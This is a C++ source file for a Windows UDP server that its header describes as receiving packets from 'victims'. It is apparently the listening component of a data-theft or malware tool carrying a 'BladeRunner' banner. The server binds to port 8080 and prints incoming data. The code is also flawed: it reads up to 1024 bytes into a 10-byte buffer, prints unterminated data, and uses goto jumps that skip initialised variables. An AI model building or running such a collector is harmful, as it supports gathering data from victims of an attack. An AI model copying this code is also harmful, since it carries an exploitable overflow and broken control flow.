/*

author : Yekuuun
github : https://github.com/yekuuun

this repo contains all code related to a simple UDP server receiving packets from victims.

*/

#include <iostream>
#include "server.hpp"
#include <winsock2.h>
#include <wS2tcpip.h>
#include <synchapi.h>

//prototype.
void display_server_message();

int launch_udp_server(){

    //initialize socket library
    WSADATA ws;

    int ws_result = WSAStartup(MAKEWORD(2,2), &ws);

    if(ws_result != 0){
        std::cout << "[ERROR] while trying to initialize socket library." << std::endl;
        return 1;
    }

    display_server_message();

    std::cout << "Configuring local address..." << std::endl;
    struct addrinfo hints;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;
    hints.ai_flags = AI_PASSIVE;

    struct addrinfo *bind_address;
    getaddrinfo(0, "8080", &hints, &bind_address);

    std::cout << "Creating socket..." << std::endl;
    SOCKET socket_listen;

    socket_listen = socket(bind_address->ai_family, bind_address->ai_socktype, bind_address->ai_protocol);

    if(socket_listen == INVALID_SOCKET){
        std::cout << "[ERROR] while trying to create socket..." << std::endl;
        goto CLEANUP;
    }

    int bind_result = bind(socket_listen, bind_address->ai_addr, bind_address->ai_addrlen);

    if(bind_result != 0){
        std::cout << "[ERROR] while trying to bind local address with socket..." << std::endl;
        goto CLEANUP;
    }

    std::cout << "Waiting for connection..." << std::endl;
    while(1) {
        struct sockaddr_storage client_address;
        socklen_t client_len = sizeof(client_address);

        char read[10];
        int bytes_received = recvfrom(socket_listen, read, 1024, 0,(struct sockaddr *)&client_address, &client_len);

        if (bytes_received < 1) {
            std::cout << "[ERROR] while receiving data." << std::endl;
            goto CLEANUP;
        }

        std::cout << "Received: " << read << std::endl;

    } //while(1)


    CLEANUP:
        freeaddrinfo(bind_address);

        if(socket_listen){
            closesocket(socket_listen);
            std::cout << "Closing socket..." << std::endl;
        }

        WSACleanup();

    return 0;
}

void display_server_message(){
        std::cout << "\x1b[35m"
              << " ____  _           _      ____                              " << std::endl
              << "| __ )| | __ _  __| | ___|  _ \\ _   _ _ __  _ __   ___ _ __ " << std::endl
              << "|  _ \\| |/ _` |/ _` |/ _ \\ |_) | | | | '_ \\| '_ \\ / _ \\ '__|" << std::endl
              << "| |_) | | (_| | (_| |  __/  _ <| |_| | | | | | | |  __/ |   " << std::endl
              << "|____/|_|\\__,_|\\__,_|\\___|_| \\_\\__,_ |_| |_|_| |_|\\___|_|   " << std::endl
              << "\x1b[0m"; // Réinitialisation de la couleur
        std::cout << "\n" << std::endl;
        std::cout << "Launching server...\n" << std::endl;
}

